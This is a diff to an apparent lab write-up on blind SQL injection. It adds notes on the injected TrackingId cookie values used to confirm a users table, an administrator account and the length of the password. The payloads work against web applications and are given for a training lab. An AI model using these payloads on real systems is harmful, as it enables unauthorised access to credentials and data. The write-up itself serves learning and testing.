@@ -214,3 +214,14 @@ after running it multiple times with diffrent positions...
 We have the password!
 
 ![pass](./lab_blind_sql/pass.png)
+
+Additional steps:
+Veryfying the existance of columns by using the following queries
+- Verify existance of users table:
+- `TrackingId= ' AND (SELECT 'a' FROM users LIMIT 1)='a`
+- Verify existance of administrator in users table
+- `TrackingId= ' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
+- Verify length of password (iterate through greater and greater lengths)
+- `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a`
+
+
